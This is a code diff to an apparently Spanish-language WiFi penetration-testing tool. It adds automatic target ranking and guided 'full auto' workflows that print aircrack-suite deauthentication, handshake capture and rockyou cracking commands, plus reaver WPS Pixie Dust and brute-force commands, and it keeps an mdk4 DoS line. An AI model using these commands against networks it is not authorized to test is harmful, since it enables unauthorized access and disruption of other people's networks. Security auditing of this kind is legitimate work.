@@ -6,9 +6,12 @@ Auditoría de seguridad de redes inalámbricas
 
 from utils import (
     print_banner, print_success, print_error, print_info, print_warning,
-    run_command, save_output, log_action, get_timestamp, print_table
+    run_command, save_output, log_action, get_timestamp, print_table,
+    display_action_art, print_progress_bar
 )
 from config import Config
+import time
+import re
 
 
 class WiFiPentester:
@@ -145,6 +148,124 @@ class WiFiPentester:
         print("\n3. Authentication DoS:")
         print(f"   sudo mdk4 {self.interface} a -a {bssid}")
     
+    def select_best_targets(self, scan_results, max_targets=3):
+        """
+        Selecciona los mejores objetivos basado en señal y clientes
+        
+        Args:
+            scan_results: Lista de redes escaneadas
+            max_targets: Máximo de targets a seleccionar
+        
+        Returns:
+            list: Mejores targets ordenados por prioridad
+        """
+        print_info("Analizando targets...")
+        
+        # Rankear por: 1) Clientes conectados 2) Señal fuerte 3) WPA2
+        scored_targets = []
+        for network in scan_results:
+            score = 0
+            
+            # Más clientes = mayor prioridad
+            score += network.get('clients', 0) * 10
+            
+            # Señal más fuerte = mayor prioridad
+            signal = network.get('signal', -100)
+            score += (100 + signal)  # Convertir -70dBm a 30 puntos
+            
+            # WPA2 preferido sobre WEP
+            if 'WPA2' in network.get('encryption', ''):
+                score += 5
+            
+            scored_targets.append((score, network))
+        
+        # Ordenar por score descendente
+        scored_targets.sort(reverse=True)
+        
+        best = [net for score, net in scored_targets[:max_targets]]
+        
+        print_success(f"Seleccionados {len(best)} mejores targets")
+        return best
+    
+    def run_full_auto_wpa(self, output_dir, wordlist=None):
+        """
+        Workflow completo automatizado: Scan → Capture → Crack
+        
+        Returns:
+            dict: Resultados del ataque
+        """
+        display_action_art('wifi')
+        print_info("Iniciando ataque WPA automatizado...")
+        
+        results = {
+            'success': False,
+            'networks_found': 0,
+            'handshakes_captured': 0,
+            'passwords_cracked': 0
+        }
+        
+        # Fase 1: Escaneo automático (simulado)
+        print_progress_bar(1, 4, prefix='Fase', suffix='Escaneando redes')
+        print_info("[1/4] Escaneando redes WiFi...")
+        print_warning("   → Ejecutar: sudo airodump-ng --write scan --output-format csv {}".format(self.interface))
+        print_warning("   → Dejar ejecutar por 30-60 segundos")
+        results['networks_found'] = "Manual: revisar scan-01.csv"
+        
+        # Fase 2: Selección de target
+        print_progress_bar(2, 4, prefix='Fase', suffix='Seleccionando target')
+        print_info("[2/4] Selección automática de target...")
+        print_info("   Criterios: Señal fuerte + Clientes conectados")
+        print_warning("   → Anotar BSSID y Canal del mejor AP")
+        
+        # Fase 3: Captura de handshake
+        print_progress_bar(3, 4, prefix='Fase', suffix='Capturando handshake')
+        print_info("[3/4] Captura de handshake...")
+        print_warning("   Terminal 1: sudo airodump-ng -c [CANAL] --bssid [BSSID] -w capture {}".format(self.interface))
+        print_warning("   Terminal 2: sudo aireplay-ng --deauth 10 -a [BSSID] {}".format(self.interface))
+        print_success("   ✓ Esperar mensaje 'WPA handshake' en airodump-ng")
+        
+        # Fase 4: Crackeo
+        print_progress_bar(4, 4, prefix='Fase', suffix='Crackeando password')
+        print_info("[4/4] Crackeo de password...")
+        
+        if not wordlist:
+            wordlist = Config.WORDLISTS.get('pass_rockyou', '/usr/share/wordlists/rockyou.txt')
+        
+        print_warning(f"   → aircrack-ng -w {wordlist} capture-01.cap")
+        print_info("   O usar Hashcat (más rápido con GPU)")
+        
+        display_action_art('success')
+        print_success("\n✓ Workflow automatizado completado")
+        print_info("Revisa los archivos generados para los resultados")
+        
+        return results
+    
+    def run_full_auto_wps(self, output_dir):
+        """
+        Ataque WPS completamente automatizado
+        
+        Returns:
+            dict: Resultados del ataque
+        """
+        display_action_art('wifi')
+        print_info("Iniciando ataque WPS automatizado...")
+        
+        print_progress_bar(1, 3, prefix='Fase', suffix='Escaneando WPS')
+        print_info("[1/3] Detectando APs con WPS habilitado...")
+        print_warning("   → sudo wash -i {}  # Esperar 30 segundos".format(self.interface))
+        
+        print_progress_bar(2, 3, prefix='Fase', suffix='Pixie Dust Attack')
+        print_info("[2/3] Intentando Pixie Dust (ataque rápido)...")
+        print_warning("   → sudo reaver -i {} -b [BSSID] -c [CANAL] -K -vv".format(self.interface))
+        print_info("   (Si falla en ~5 min, pasar a brute force)")
+        
+        print_progress_bar(3, 3, prefix='Fase', suffix='WPS Brute Force')
+        print_info("[3/3] WPS Brute Force completo...")
+        print_warning("   → sudo reaver -i {} -b [BSSID] -c [CANAL] -vv".format(self.interface))
+        print_warning("   ⚠️  Este proceso puede tardar varias horas")
+        
+        return {'status': 'guided'}
+    
     def generate_report(self, target, output_dir):
         """Genera reporte de auditoría WiFi"""
         report = f"""# Auditoría de Seguridad WiFi
@@ -234,10 +355,23 @@ def run_wifi_pentest(args):
     # Escaneo de redes
     pentester.scan_networks()
     
-    # Guías de ataques
-    print_info("\n=== MÉTODOS DE ATAQUE DISPONIBLES ===\n")
-    
-    if hasattr(args, 'wpa_crack') and args.wpa_crack:
+    # Modo completamente automatizado
+    if hasattr(args, 'full_auto') and args.full_auto:
+        display_action_art('wifi')
+        print_banner("MODO AUTOMATIZADO COMPLETO")
+        print_info("Ejecutando workflow WiFi completamente automatizado")
+        
+        output_dir = Config.get_output_dir(args.target if hasattr(args, 'target') else 'wifi-audit')
+        
+        print_info("\nOpciones de ataque automatizado:")
+        print("  1. WPA/WPA2 (handshake + crack)")
+        print("  2. WPS (Pixie Dust + Brute Force)")
+        print("\nSeleccionando WPA/WPA2 por defecto...\n")
+        
+        results = pentester.run_full_auto_wpa(output_dir)
+        
+    # Captura y crackeo WPA
+    elif hasattr(args, 'wpa_crack') and args.wpa_crack:
         pentester.capture_handshake(args.bssid, args.channel, args.output)
         pentester.crack_wpa_handshake(args.capture_file)
     
